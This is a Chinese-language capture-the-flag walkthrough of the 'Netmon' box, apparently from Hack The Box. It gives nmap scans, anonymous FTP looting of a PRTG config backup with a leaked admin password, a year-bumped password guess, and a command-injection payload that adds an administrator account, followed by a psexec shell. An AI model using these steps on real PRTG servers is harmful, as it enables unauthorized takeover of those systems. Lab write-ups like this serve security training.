# Netmon

1.  nmap 扫描

    ```shell
    # 对 TCP 端口进行扫描
    nmap -sT -p- --min-rate 1000  -Pn 10.10.10.152
    	PORT      STATE SERVICE
        21/tcp    open  ftp
        135/tcp   open  msrpc
        445/tcp   open  microsoft-ds  # SMB 服务
        5985/tcp  open  wsman
        47001/tcp open  winrm
        49665/tcp open  unknown
        49666/tcp open  unknown
        49667/tcp open  unknown
        49668/tcp open  unknown
        49669/tcp open  unknown

    # 对 UDP 端口扫描，因为对结果无用处就不粘贴
    sudo nmap -sU -p- --min-rate 1000 -Pn 10.10.10.152

    # 对探测到的端口进行扫描
    nmap -sTCV -p 21 135 445 5985 47001 49665 49666 49667 49668 49669 --min-rate 1000 10.10.10.152
    	PORT   STATE SERVICE VERSION
        21/tcp open  ftp     Microsoft ftpd
        | ftp-syst: 
        |_  SYST: Windows_NT
        | ftp-anon: Anonymous FTP login allowed (FTP code 230)  # 允许匿名者登陆
        | 02-02-19  11:18PM                 1024 .rnd
        | 02-25-19  09:15PM       <DIR>          inetpub
        | 07-16-16  08:18AM       <DIR>          PerfLogs
        | 02-25-19  09:56PM       <DIR>          Program Files
        | 02-02-19  11:28PM       <DIR>          Program Files (x86)
        | 02-03-19  07:08AM       <DIR>          Users
        |_02-25-19  10:49PM       <DIR>          Windows
        Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    ```
2.  使用网页登陆，可以看到相关的可以访问

    ```shell
    # PRTG Network Monitor (NETMON) # 服务名称--网关
    # 使用默认密码登陆失败，看 nmap 扫描结果
    ```
3. 经过 nmap 扫描，我们发现 ftp 服务可以使用 匿名登陆
4. 我们可以在 /Users/All Users/Paessler/PRTG Network Monitor 这里看到关于 这个服务的一些配置文件，`为什么在这里，我也不清楚，可能是对服务名称的搜索吧`
5.  在这里我们下载其中的一些内容

    ```shell
    PRTG Configuration.dat
    PRTG Configuration.old
    PRTG Configuration.old.dat
    ```
6.  我们最终可以在 PRTG Configuration.old.dat 找到相关的账号密码

    ```shell
    <dbpassword>
        <!-- User: prtgadmin -->
        PrTg@dmin2018
    </dbpassword>
    ```
7. 进行登陆可以发现登陆失败，对密码进行猜解可以得知，这个密码唯一可以推测的就是后面的年份进行变化登陆,最终可以得到 密码为 PrTg@dmin2019
8. 在网上搜索这个网关应用的漏洞，可以发现这篇文章： [跳转链接](https://www.codewatch.org/blog/?p=453)
9.  从这篇文章中，我们可以得到一些利用思路

    ```shell
    # 使用下方命令，这个命令会添加一个用户,并添加到 administrators
    test.txt;net user anon p3nT3st! /add;net localgroup administrators anon /add

    # 枚举 smb 服务
    smbmap -H 10.10.10.152  -u anon -p "p3nT3st!"

    # 获取 shell
    psexec.py 'anon:p3nT3st!@10.10.10.152'
    ```
